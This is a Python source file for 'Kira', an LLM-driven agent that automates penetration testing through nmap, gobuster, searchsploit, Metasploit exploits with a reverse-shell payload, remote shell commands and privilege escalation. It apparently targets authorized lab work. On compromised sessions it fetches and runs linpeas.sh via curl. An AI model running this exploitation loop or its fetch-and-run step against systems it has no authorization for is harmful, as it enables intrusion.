"""
kira/planner.py — Planner
==========================
The brain of Kira. Runs the observe → think → act loop, dispatching
each LLM-chosen action to the correct executor, updating state, and
auto-advancing phases when completion criteria are met.

Architecture:
    Planner.__init__(state, runner, llm, msf, kb)
    Planner.run(max_iterations=50) -> str
        └─ loop:
            1. Observe  — state.get_context_summary() + PhaseController focus
            2. Think    — llm.next_action(context, phase) → action dict
            3. Dispatch — _dispatch(action) → result_summary string
            4. Update   — state.log_action() + kb sync
            5. Gate     — _check_phase_gate() → advance or exit

Exit reasons returned by run():
    "DONE"      — REPORT action emitted with findings present
    "HALTED"    — LLM emitted HALT or anti-loop guard triggered
    "ROOT"      — is_root became True (privilege escalation succeeded)
    "MAX_ITER"  — max_iterations reached without completing

Usage (from main.py):
    from kira.planner import Planner

    planner = Planner(state=sm, runner=runner, llm=llm, msf=None, kb=kb)
    reason  = planner.run(max_iterations=50)
    print(f"Session ended: {reason}")
"""

import json
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Optional

# ── Phase completion criteria ─────────────────────────────────────────────────
# Each phase requires all listed state keys to be non-empty before the planner
# auto-advances. The LLM can also emit "advance_phase" to force advancement.

PHASE_COMPLETION = {
    "RECON":        ["open_ports"],
    "ENUM":         ["open_ports", "findings"],
    "VULN_SCAN":    ["findings"],
    "EXPLOIT":      ["sessions"],
    "POST_EXPLOIT": ["current_user"],
    "REPORT":       [],   # terminal — always complete
    "DONE":         [],
}

# Minimum findings required before REPORT is valid
MIN_FINDINGS_FOR_REPORT = 1


# ── PhaseController ────────────────────────────────────────────────────────────

class PhaseController:
    """
    Tracks per-phase context focus and completion logic.
    Injected into the LLM prompt alongside the state summary
    so Gemma 3 4B knows exactly what it should be doing right now.
    """

    PHASE_FOCUS = {
        "RECON": (
            "Run an nmap scan if you haven't yet. "
            "Goal: discover all open ports and service versions."
        ),
        "ENUM": (
            "Enumerate each discovered service. Run gobuster on HTTP ports, "
            "enum4linux on SMB, curl/whatweb for server banners. "
            "Goal: find web paths, usernames, shares, and version strings."
        ),
        "VULN_SCAN": (
            "Cross-reference every service version with searchsploit. "
            "Add findings for each CVE found. "
            "Goal: build a prioritised list of exploitable vulnerabilities."
        ),
        "EXPLOIT": (
            "Attempt exploitation of the highest-CVSS finding with an "
            "available Metasploit module. "
            "Goal: obtain a shell session."
        ),
        "POST_EXPLOIT": (
            "You have a session. Run linpeas, check sudo, SUID binaries, "
            "cron jobs, and kernel version. "
            "Goal: escalate to root."
        ),
        "REPORT": (
            "Emit the REPORT action. "
            "All findings have been collected."
        ),
        "DONE": "Session complete.",
    }

    def __init__(self, state):
        self._state = state

    def focus(self) -> str:
        return self.PHASE_FOCUS.get(self._state.phase, "")

    def is_phase_complete(self) -> bool:
        """
        Returns True when all required state fields for the current phase
        are populated (non-empty list / non-None value).
        """
        required = PHASE_COMPLETION.get(self._state.phase, [])
        for key in required:
            val = self._state.get(key)
            if not val:                 # None, [], {}, ""
                return False
        return True

    def context_with_focus(self) -> str:
        """
        Full context string = state summary + current phase focus directive.
        This is what gets passed to llm.next_action() every iteration.
        """
        summary = self._state.get_context_summary()
        focus   = self.focus()
        if focus:
            return f"{summary}\n\nCURRENT FOCUS: {focus}"
        return summary


# ── Planner ────────────────────────────────────────────────────────────────────

class Planner:
    """
    Observe → Think → Act agent loop for Kira.

    Parameters
    ----------
    state   : StateManager instance (from kira/state.py)
    runner  : ToolRunner instance   (from kira/tool_runner.py)
    llm     : LLMClient instance    (from kira/llm.py)
    msf     : Metasploit RPC client (pymetasploit3 MsfRpcClient or None)
               None is fine for Days 1–2; wired in on Day 3.
    kb      : KnowledgeBase instance (from kira/findings.py)
               Can be None — planner will skip KB sync if so.
    verbose : print iteration header to terminal each loop tick
    """

    MAX_SAME_ACTION = 3      # anti-loop guard: halt after N identical actions

    def __init__(
        self,
        state,
        runner,
        llm,
        msf=None,
        kb=None,
        verbose: bool = True,
    ):
        self._state   = state
        self._runner  = runner
        self._llm     = llm
        self._msf     = msf
        self._kb      = kb
        self._verbose = verbose
        self._phase_ctrl = PhaseController(state)

        # Anti-loop tracking
        self._action_history: list[str] = []   # recent "tool:args_hash" strings

    # ── Public: run ────────────────────────────────────────────────────────────

    def run(self, max_iterations: int = 50) -> str:
        """
        Execute the agent loop until a terminal condition is reached.

        Returns one of: "DONE" | "HALTED" | "ROOT" | "MAX_ITER"
        """
        self._print_banner()

        for iteration in range(1, max_iterations + 1):

            self._print_iter_header(iteration, max_iterations)

            # ── 1. Observe ─────────────────────────────────────────────────
            context = self._phase_ctrl.context_with_focus()

            # ── 2. Think ───────────────────────────────────────────────────
            action = self._llm.next_action(
                context_summary=context,
                phase=self._state.phase,
            )

            tool      = action.get("tool", "HALT")
            args      = action.get("args", {})
            reasoning = action.get("reasoning", "")

            self._print_action(tool, args, reasoning)

            # ── 3. Anti-loop guard ─────────────────────────────────────────
            if self._anti_loop_check(action):
                msg = (
                    f"Anti-loop guard triggered: '{tool}' with identical args "
                    f"seen {self.MAX_SAME_ACTION} times consecutively. "
                    "Reassessing — injecting HALT."
                )
                self._print_warn(msg)
                self._state.log_action("HALT", {}, msg)
                return "HALTED"

            # ── 4. Terminal actions ────────────────────────────────────────
            if tool == "HALT":
                self._state.log_action("HALT", args, reasoning)
                self._print_info(f"Agent halted: {reasoning}")
                return "HALTED"

            if tool == "REPORT":
                findings = self._state.get("findings", [])
                if len(findings) < MIN_FINDINGS_FOR_REPORT:
                    # Not enough data — don't report yet, nudge the planner
                    self._state.log_action(
                        "REPORT_REJECTED", {},
                        "REPORT requested but no findings in state yet. "
                        "Continue enumeration.",
                    )
                    self._print_warn(
                        "REPORT rejected — no findings yet. Continuing..."
                    )
                    continue
                self._state.log_action("REPORT", {}, "Generating final report.")
                self._state.update(phase="REPORT")
                self._print_info("REPORT action received — exiting loop.")
                return "DONE"

            # ── 5. Dispatch → execute ──────────────────────────────────────
            result_summary = self._dispatch(action)

            # ── 6. Update state ────────────────────────────────────────────
            self._state.log_action(tool, args, result_summary)
            self._sync_kb_to_state()

            self._print_result(result_summary)

            # ── 7. Root check ──────────────────────────────────────────────
            if self._state.is_root:
                self._print_info("Root obtained! Advancing to POST_EXPLOIT.")
                if self._state.phase not in ("POST_EXPLOIT", "REPORT", "DONE"):
                    self._state.update(phase="POST_EXPLOIT")
                # Continue looping — post-exploit enum still needed
                # Return ROOT only after post-exploit enumeration is done
                if self._phase_ctrl.is_phase_complete():
                    return "ROOT"

            # ── 8. Phase gate ──────────────────────────────────────────────
            exit_reason = self._check_phase_gate()
            if exit_reason:
                return exit_reason

            # Small pause between iterations to avoid hammering Ollama
            time.sleep(0.5)

        self._print_warn(f"Max iterations ({max_iterations}) reached.")
        self._state.log_action(
            "MAX_ITER", {},
            f"Loop terminated after {max_iterations} iterations."
        )
        return "MAX_ITER"

    # ── Dispatch ───────────────────────────────────────────────────────────────

    def _dispatch(self, action: dict) -> str:
        """
        Route action["tool"] to the correct executor method.
        Always returns a result_summary string — never raises.
        Handles all 14 tool names from VALID_TOOLS.
        """
        tool = action.get("tool", "")
        args = action.get("args", {})
        target = self._state.target or ""

        try:
            # ── Recon ──────────────────────────────────────────────────────
            if tool == "nmap_scan":
                return self._do_nmap(args, target)

            # ── Enumeration ────────────────────────────────────────────────
            elif tool == "gobuster_dir":
                return self._do_gobuster(args)

            elif tool == "searchsploit":
                return self._do_searchsploit(args)

            elif tool == "enum4linux":
                return self._do_enum4linux(args, target)

            elif tool == "curl_probe":
                return self._do_curl(args)

            elif tool == "whatweb":
                return self._do_whatweb(args)

            # ── Exploitation ───────────────────────────────────────────────
            elif tool == "msf_exploit":
                return self._do_msf_exploit(args)

            # ── Post-exploitation ──────────────────────────────────────────
            elif tool == "shell_cmd":
                return self._do_shell_cmd(args)

            elif tool == "linpeas":
                return self._do_linpeas(args)

            # ── State helpers ──────────────────────────────────────────────
            elif tool == "add_finding":
                return self._do_add_finding(args)

            elif tool == "add_note":
                return self._do_add_note(args)

            elif tool == "advance_phase":
                return self._do_advance_phase()

            # ── Should not reach here (HALT/REPORT handled above) ──────────
            else:
                msg = f"Unknown tool dispatched: '{tool}'"
                self._state.log_error(tool, msg)
                return msg

        except Exception as exc:
            msg = f"Dispatch error for '{tool}': {exc}"
            self._state.log_error(tool, msg)
            return msg

    # ── Tool implementations ───────────────────────────────────────────────────

    def _do_nmap(self, args: dict, target: str) -> str:
        tgt   = args.get("target", target)
        flags = args.get("flags", "-sV -sC")
        ports = args.get("ports")

        result = self._runner.nmap(target=tgt, flags=flags, ports=ports)

        if result.ok and result.artifact_path:
            try:
                from kira.parsers.nmap_parser import (
                    parse_nmap_xml,
                    extract_state_fields,
                    get_notable_script_findings,
                )
                parsed = parse_nmap_xml(result.artifact_path)
                fields = extract_state_fields(parsed)
                self._state.update(**fields)

                # Auto-add NSE script findings into KB
                if self._kb:
                    for f in get_notable_script_findings(parsed):
                        self._kb.add_dict(f)

                port_count = len(fields.get("open_ports", []))
                return (
                    f"Found {port_count} open ports: "
                    f"{fields.get('open_ports', [])}. "
                    f"Services: {list(fields.get('services', {}).values())[:5]}"
                )
            except Exception as e:
                return f"nmap OK but parse failed: {e}. raw: {result.summary}"

        return result.summary

    def _do_gobuster(self, args: dict) -> str:
        url      = args.get("url", f"http://{self._state.target}")
        wordlist = args.get(
            "wordlist",
            "/usr/share/wordlists/dirb/common.txt",
        )
        result = self._runner.gobuster(url=url, wordlist=wordlist)

        if result.ok:
            try:
                from kira.parsers.gobuster_parser import parse_gobuster
                parsed = parse_gobuster(result.stdout)
                paths  = parsed.get("all_paths", [])
                juicy  = parsed.get("juicy_paths", [])
                self._state.update(web_paths=paths)

                if self._kb:
                    for f in parsed.get("auto_findings", []):
                        self._kb.add_dict(f)

                return (
                    f"Found {len(paths)} paths. "
                    f"Juicy: {juicy[:5] or 'none'}"
                )
            except Exception as e:
                return f"gobuster OK but parse failed: {e}"

        return result.summary

    def _do_searchsploit(self, args: dict) -> str:
        query  = args.get("query", "")
        if not query:
            return "searchsploit skipped — no query provided"

        result = self._runner.searchsploit(query=query)

        if result.ok and result.stdout:
            try:
                from kira.parsers.vuln_scanner import parse_searchsploit_json
                findings = parse_searchsploit_json(result.stdout)
                if self._kb:
                    for f in findings:
                        self._kb.add_dict(f)
                return (
                    f"searchsploit '{query}': {len(findings)} results. "
                    + (
                        f"MSF modules: {sum(1 for f in findings if f.get('exploit_available'))}"
                        if findings else "no exploits found"
                    )
                )
            except Exception as e:
                return f"searchsploit OK but parse failed: {e}. raw: {result.summary}"

        return result.summary

    def _do_enum4linux(self, args: dict, target: str) -> str:
        tgt    = args.get("target", target)
        flags  = args.get("flags", "-a")
        result = self._runner.enum4linux(target=tgt, flags=flags)
        return result.summary

    def _do_curl(self, args: dict) -> str:
        url   = args.get("url", f"http://{self._state.target}")
        flags = args.get("flags", "-sI")
        result = self._runner.curl(url=url, flags=flags)
        if result.ok:
            # Extract Server header for state
            for line in result.stdout.splitlines():
                if line.lower().startswith("server:"):
                    server = line.split(":", 1)[1].strip()
                    port   = _url_to_port(url)
                    svcs   = dict(self._state.get("services") or {})
                    if port and str(port) not in svcs:
                        svcs[str(port)] = server
                        self._state.update(services=svcs)
                    break
        return result.summary

    def _do_whatweb(self, args: dict) -> str:
        url    = args.get("url", f"http://{self._state.target}")
        result = self._runner.whatweb(url=url)
        return result.summary

    def _do_msf_exploit(self, args: dict) -> str:
        """
        Run a Metasploit module.
        Requires self._msf (MsfRpcClient) — stubs gracefully if None.
        Full implementation wired on Day 3 when pymetasploit3 is set up.
        """
        if self._msf is None:
            return (
                "Metasploit RPC not connected. "
                "Start msfrpcd and pass MsfRpcClient to Planner. "
                f"Requested module: {args.get('module', '?')}"
            )

        module_path = args.get("module", "")
        options     = args.get("options", {})

        try:
            exploit = self._msf.modules.use("exploit", module_path)
            for k, v in options.items():
                exploit[k] = v
            exploit["LHOST"] = options.get("LHOST", "")

            payload = self._msf.modules.use(
                "payload",
                args.get("payload", "generic/shell_reverse_tcp"),
            )
            result = exploit.execute(payload=payload)

            # Check if a new session appeared
            sessions = list(self._msf.sessions.list.keys())
            if sessions:
                sess_list = [
                    {"id": sid, "type": "meterpreter"}
                    for sid in sessions
                ]
                self._state.update(sessions=sess_list)
                return (
                    f"Exploit succeeded — {len(sessions)} session(s) opened: "
                    f"{sessions}"
                )

            return f"Exploit ran but no session opened. Result: {result}"

        except Exception as e:
            self._state.log_error("msf_exploit", str(e))
            return f"msf_exploit error: {e}"

    def _do_shell_cmd(self, args: dict) -> str:
        """Run a command on an active session."""
        cmd        = args.get("cmd", "id")
        session_id = int(args.get("session_id", 1))

        if self._msf is None:
            return "shell_cmd: Metasploit RPC not connected."

        try:
            session = self._msf.sessions.session(str(session_id))
            result  = session.run_with_output(cmd, timeout=30)
            output  = result.strip()

            # Auto-detect root escalation
            if "uid=0" in output or "root" in output.lower():
                self._state.update(is_root=True, current_user="root")
            elif output.startswith("uid="):
                user = output.split("(")[1].split(")")[0] if "(" in output else output
                self._state.update(current_user=user)

            # Log shell history
            history = list(self._state.get("shell_history") or [])
            history.append({"cmd": cmd, "output": output[:300]})
            self._state.update(shell_history=history[-50:])

            return f"shell_cmd '{cmd}': {output[:200]}"

        except Exception as e:
            self._state.log_error("shell_cmd", str(e))
            return f"shell_cmd error: {e}"

    def _do_linpeas(self, args: dict) -> str:
        """
        Upload and run linpeas.sh on an active session.
        Parses output for quick-win privesc vectors.
        """
        session_id = int(args.get("session_id", 1))

        if self._msf is None:
            return "linpeas: Metasploit RPC not connected."

        try:
            session = self._msf.sessions.session(str(session_id))

            # Download linpeas if not already on target
            dl_cmd = (
                "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest"
                "/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh"
            )
            session.run_with_output(dl_cmd, timeout=30)
            output = session.run_with_output("/tmp/linpeas.sh 2>/dev/null", timeout=120)

            # Surface a few key vectors as findings
            findings = _parse_linpeas_output(output)
            if self._kb:
                for f in findings:
                    self._kb.add_dict(f)

            lines = [l for l in output.splitlines() if l.strip()]
            return (
                f"linpeas ran — {len(lines)} output lines, "
                f"{len(findings)} privesc vectors flagged"
            )

        except Exception as e:
            self._state.log_error("linpeas", str(e))
            return f"linpeas error: {e}"

    def _do_add_finding(self, args: dict) -> str:
        """LLM manually registers a finding it observed."""
        required = ("title", "severity", "description")
        missing  = [k for k in required if not args.get(k)]
        if missing:
            return f"add_finding skipped — missing fields: {missing}"

        finding = {
            "title":             args.get("title", ""),
            "severity":          args.get("severity", "info"),
            "port":              int(args.get("port", 0)),
            "service":           args.get("service", ""),
            "cvss":              float(args.get("cvss", 0.0)),
            "cve":               args.get("cve", ""),
            "exploit_available": bool(args.get("exploit_available", False)),
            "description":       args.get("description", ""),
            "remediation":       args.get("remediation", ""),
        }

        if self._kb:
            self._kb.add_dict(finding)
        else:
            self._state.add_finding(finding)

        return f"Finding added: [{finding['severity'].upper()}] {finding['title']}"

    def _do_add_note(self, args: dict) -> str:
        note = args.get("note", "")
        if not note:
            return "add_note skipped — no note text"
        self._state.add_note(note)
        return f"Note saved: {note[:100]}"

    def _do_advance_phase(self) -> str:
        old = self._state.phase
        new = self._state.advance_phase()
        return f"Phase advanced: {old} → {new}"

    # ── Phase gate ─────────────────────────────────────────────────────────────

    def _check_phase_gate(self) -> Optional[str]:
        """
        Check if the current phase is complete and advance if so.
        Returns an exit reason string if the session should end, else None.
        """
        if not self._phase_ctrl.is_phase_complete():
            return None

        current = self._state.phase

        # POST_EXPLOIT complete → generate report
        if current == "POST_EXPLOIT":
            self._print_info("POST_EXPLOIT complete — advancing to REPORT phase.")
            self._state.update(phase="REPORT")
            return "DONE"

        # REPORT phase is terminal
        if current in ("REPORT", "DONE"):
            return "DONE"

        # Otherwise advance to next phase
        old = current
        new = self._state.advance_phase()
        self._print_info(f"Phase gate: {old} → {new}")
        return None

    # ── Anti-loop guard ────────────────────────────────────────────────────────

    def _anti_loop_check(self, action: dict) -> bool:
        """
        Returns True (trigger halt) if the same tool+args combination
        has appeared MAX_SAME_ACTION times consecutively.

        Uses a canonical hash of (tool, sorted args) so minor whitespace
        differences don't defeat the guard.
        """
        tool = action.get("tool", "")
        args = action.get("args", {})

        # Canonical key: tool name + sorted JSON of args
        key = f"{tool}:{json.dumps(args, sort_keys=True)}"

        self._action_history.append(key)

        # Only look at the tail
        tail = self._action_history[-self.MAX_SAME_ACTION:]
        if len(tail) == self.MAX_SAME_ACTION and len(set(tail)) == 1:
            return True

        return False

    # ── KB → state sync ────────────────────────────────────────────────────────

    def _sync_kb_to_state(self) -> None:
        """Push KnowledgeBase findings into StateManager after every action."""
        if self._kb is None:
            return
        try:
            self._state.update(findings=self._kb.to_state_dicts())
        except Exception:
            pass   # never crash the loop on a sync failure

    # ── Console output ─────────────────────────────────────────────────────────

    def _print_banner(self) -> None:
        if not self._verbose:
            return
        try:
            from rich.console import Console
            from rich.panel   import Panel
            Console().print(Panel(
                f"[bold green]Kira[/bold green] — target: [cyan]{self._state.target}[/cyan]  "
                f"phase: [yellow]{self._state.phase}[/yellow]",
                title="Agent loop started",
                border_style="dim",
            ))
        except ImportError:
            print(f"\n[KIRA] target={self._state.target}  phase={self._state.phase}")

    def _print_iter_header(self, i: int, total: int) -> None:
        if not self._verbose:
            return
        try:
            from rich.console import Console
            Console().print(
                f"\n[dim]─── iteration {i}/{total} "
                f"│ phase: {self._state.phase} ───[/dim]"
            )
        except ImportError:
            print(f"\n--- iter {i}/{total}  phase={self._state.phase} ---")

    def _print_action(self, tool: str, args: dict, reasoning: str) -> None:
        if not self._verbose:
            return
        try:
            from rich.console import Console
            c = Console()
            c.print(f"  [bold cyan]THINK[/bold cyan]  tool=[green]{tool}[/green]  args={args}")
            c.print(f"  [dim]reason: {reasoning[:120]}[/dim]")
        except ImportError:
            print(f"  THINK  tool={tool}  args={args}\n  reason: {reasoning[:120]}")

    def _print_result(self, summary: str) -> None:
        if not self._verbose:
            return
        try:
            from rich.console import Console
            Console().print(f"  [bold]RESULT[/bold]  {summary[:160]}")
        except ImportError:
            print(f"  RESULT  {summary[:160]}")

    def _print_info(self, msg: str) -> None:
        if not self._verbose:
            return
        try:
            from rich.console import Console
            Console().print(f"  [bold green]INFO[/bold green]   {msg}")
        except ImportError:
            print(f"  INFO   {msg}")

    def _print_warn(self, msg: str) -> None:
        if not self._verbose:
            return
        try:
            from rich.console import Console
            Console().print(f"  [bold yellow]WARN[/bold yellow]   {msg}")
        except ImportError:
            print(f"  WARN   {msg}")


# ── Linpeas output parser (minimal) ───────────────────────────────────────────

def _parse_linpeas_output(output: str) -> list[dict]:
    """
    Scan linpeas output for quick-win privesc vectors.
    Returns partial Finding dicts. Intentionally minimal — expands on Day 4.
    """
    findings = []
    lines    = output.splitlines()
    output_lower = output.lower()

    checks = [
        (
            "sudo -l" in output_lower and "nopasswd" in output_lower,
            {
                "title":       "NOPASSWD sudo rule detected",
                "severity":    "high",
                "cvss":        7.8,
                "port":        0,
                "service":     "sudo",
                "description": "A sudo rule allows command execution without password.",
                "remediation": "Review /etc/sudoers and remove NOPASSWD entries.",
                "exploit_available": True,
            },
        ),
        (
            any("suid" in l.lower() and "/" in l for l in lines),
            {
                "title":       "SUID binary found",
                "severity":    "medium",
                "cvss":        6.5,
                "port":        0,
                "service":     "filesystem",
                "description": "One or more SUID binaries detected — may allow privesc.",
                "remediation": "Audit SUID binaries with: find / -perm -4000 2>/dev/null",
                "exploit_available": True,
            },
        ),
        (
            "writable" in output_lower and "cron" in output_lower,
            {
                "title":       "Writable cron job or script detected",
                "severity":    "high",
                "cvss":        7.2,
                "port":        0,
                "service":     "cron",
                "description": "A cron job script is world-writable, enabling privesc.",
                "remediation": "Remove world-write permissions from cron scripts.",
                "exploit_available": True,
            },
        ),
    ]

    for condition, finding in checks:
        if condition:
            findings.append(finding)

    return findings


# ── URL helpers ────────────────────────────────────────────────────────────────

def _url_to_port(url: str) -> Optional[int]:
    """Extract the port number from a URL string."""
    try:
        from urllib.parse import urlparse
        parsed = urlparse(url)
        if parsed.port:
            return parsed.port
        return 443 if parsed.scheme == "https" else 80
    except Exception:
        return None


# ── Smoke test ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import sys
    import tempfile

    sys.path.insert(0, "/mnt/user-data/outputs")

    from state       import StateManager
    from tool_runner import ToolRunner
    from llm         import LLMClient

    print("=== planner.py smoke test (offline — no real LLM/tools) ===\n")

    # ── Shared fixtures ────────────────────────────────────────────────────────
    with tempfile.TemporaryDirectory() as tmp:

        sm = StateManager(session_dir=tmp)
        sm.init(target="10.10.10.5", authorized_by="Lab VM")

        runner = ToolRunner(session_dir=tmp, verbose=False)

        # ── 1. PhaseController ─────────────────────────────────────────────
        print("[1] PhaseController")
        pc = PhaseController(sm)
        assert not pc.is_phase_complete(), "RECON should not be complete with no ports"
        sm.update(open_ports=[22, 80])
        assert pc.is_phase_complete(), "RECON should be complete with ports"
        focus = pc.focus()
        assert "nmap" in focus.lower() or "port" in focus.lower()
        print(f"    focus: {focus[:80]}")
        ctx = pc.context_with_focus()
        assert "CURRENT FOCUS" in ctx
        print(f"    context length: {len(ctx)} chars\n")

        # ── 2. Anti-loop guard ─────────────────────────────────────────────
        print("[2] Anti-loop guard")
        sm2 = StateManager(session_dir=tmp + "/s2")
        sm2.init(target="10.10.10.5", authorized_by="test")

        # Stub LLM that always returns the same action
        class StuckLLM:
            def next_action(self, context_summary, phase=""):
                return {
                    "tool":      "nmap_scan",
                    "args":      {"target": "10.10.10.5"},
                    "reasoning": "always nmap",
                }

        planner = Planner(
            state=sm2, runner=runner,
            llm=StuckLLM(), msf=None, kb=None,
            verbose=False,
        )
        reason = planner.run(max_iterations=10)
        assert reason == "HALTED", f"Expected HALTED, got {reason}"
        print(f"    anti-loop triggered correctly: exit='{reason}'\n")

        # ── 3. HALT action ────────────────────────────────────────────────
        print("[3] HALT action handling")
        sm3 = StateManager(session_dir=tmp + "/s3")
        sm3.init(target="10.10.10.5", authorized_by="test")

        class HaltLLM:
            def next_action(self, context_summary, phase=""):
                return {"tool": "HALT", "args": {}, "reasoning": "Nothing to do."}

        planner3 = Planner(
            state=sm3, runner=runner,
            llm=HaltLLM(), msf=None, kb=None,
            verbose=False,
        )
        reason3 = planner3.run(max_iterations=5)
        assert reason3 == "HALTED", f"Expected HALTED, got {reason3}"
        print(f"    HALT action handled: exit='{reason3}'\n")

        # ── 4. REPORT blocked without findings ────────────────────────────
        print("[4] REPORT blocked when no findings")
        sm4 = StateManager(session_dir=tmp + "/s4")
        sm4.init(target="10.10.10.5", authorized_by="test")

        call_count = {"n": 0}
        class ReportThenHaltLLM:
            def next_action(self, context_summary, phase=""):
                call_count["n"] += 1
                if call_count["n"] == 1:
                    return {"tool": "REPORT", "args": {}, "reasoning": "done"}
                return {"tool": "HALT",   "args": {}, "reasoning": "giving up"}

        planner4 = Planner(
            state=sm4, runner=runner,
            llm=ReportThenHaltLLM(), msf=None, kb=None,
            verbose=False,
        )
        reason4 = planner4.run(max_iterations=5)
        assert reason4 == "HALTED", f"Expected HALTED after blocked REPORT, got {reason4}"
        print(f"    REPORT correctly blocked (no findings), then HALTED: '{reason4}'\n")

        # ── 5. REPORT accepted with findings ──────────────────────────────
        print("[5] REPORT accepted when findings present")
        sm5 = StateManager(session_dir=tmp + "/s5")
        sm5.init(target="10.10.10.5", authorized_by="test")
        sm5.add_finding({
            "title":    "Test vuln", "severity": "high",
            "port":     80,          "service":  "http",
            "description": "Test.",  "cvss":     7.5,
        })

        class ReportLLM:
            def next_action(self, context_summary, phase=""):
                return {"tool": "REPORT", "args": {}, "reasoning": "findings ready"}

        planner5 = Planner(
            state=sm5, runner=runner,
            llm=ReportLLM(), msf=None, kb=None,
            verbose=False,
        )
        reason5 = planner5.run(max_iterations=5)
        assert reason5 == "DONE", f"Expected DONE, got {reason5}"
        assert sm5.phase == "REPORT"
        print(f"    REPORT accepted with findings: exit='{reason5}'  phase='{sm5.phase}'\n")

        # ── 6. _dispatch: add_finding ──────────────────────────────────────
        print("[6] _dispatch: add_finding")
        sm6 = StateManager(session_dir=tmp + "/s6")
        sm6.init(target="10.10.10.5", authorized_by="test")
        planner6 = Planner(
            state=sm6, runner=runner,
            llm=HaltLLM(), msf=None, kb=None,
            verbose=False,
        )
        summary = planner6._dispatch({
            "tool": "add_finding",
            "args": {
                "title":       "Test Finding",
                "severity":    "medium",
                "port":        443,
                "service":     "https",
                "description": "TLS misconfiguration.",
                "cvss":        5.5,
            },
        })
        assert "Test Finding" in summary
        assert len(sm6.get("findings")) == 1
        print(f"    dispatch add_finding: '{summary}'\n")

        # ── 7. _dispatch: add_note ─────────────────────────────────────────
        print("[7] _dispatch: add_note")
        note_summary = planner6._dispatch({
            "tool": "add_note",
            "args": {"note": "Port 8080 returns 403 — might be filtered."},
        })
        assert "saved" in note_summary.lower()
        assert len(sm6.get("notes")) == 1
        print(f"    dispatch add_note: '{note_summary}'\n")

        # ── 8. _dispatch: advance_phase ────────────────────────────────────
        print("[8] _dispatch: advance_phase")
        old_phase = sm6.phase
        adv_summary = planner6._dispatch({"tool": "advance_phase", "args": {}})
        assert "→" in adv_summary
        print(f"    dispatch advance_phase: '{adv_summary}'\n")

        # ── 9. _dispatch: unknown tool (no crash) ─────────────────────────
        print("[9] _dispatch: unknown tool — no crash")
        bad_summary = planner6._dispatch({"tool": "totally_fake_tool", "args": {}})
        assert "Unknown" in bad_summary
        print(f"    unknown tool handled: '{bad_summary}'\n")

        # ── 10. MAX_ITER exit ──────────────────────────────────────────────
        print("[10] MAX_ITER exit")
        sm7 = StateManager(session_dir=tmp + "/s7")
        sm7.init(target="10.10.10.5", authorized_by="test")

        action_num = {"n": 0}
        class RotatingLLM:
            """Returns different tools so anti-loop guard doesn't trigger."""
            TOOLS = ["add_note", "curl_probe", "whatweb", "add_note", "curl_probe"]
            def next_action(self, context_summary, phase=""):
                t = self.TOOLS[action_num["n"] % len(self.TOOLS)]
                action_num["n"] += 1
                return {"tool": t, "args": {"note": f"note {action_num['n']}", "url": "http://x"}, "reasoning": "rotating"}

        planner7 = Planner(
            state=sm7, runner=runner,
            llm=RotatingLLM(), msf=None, kb=None,
            verbose=False,
        )
        reason7 = planner7.run(max_iterations=3)
        assert reason7 == "MAX_ITER", f"Expected MAX_ITER, got {reason7}"
        print(f"    MAX_ITER exit after 3 iterations: '{reason7}'\n")

    print("All tests passed.")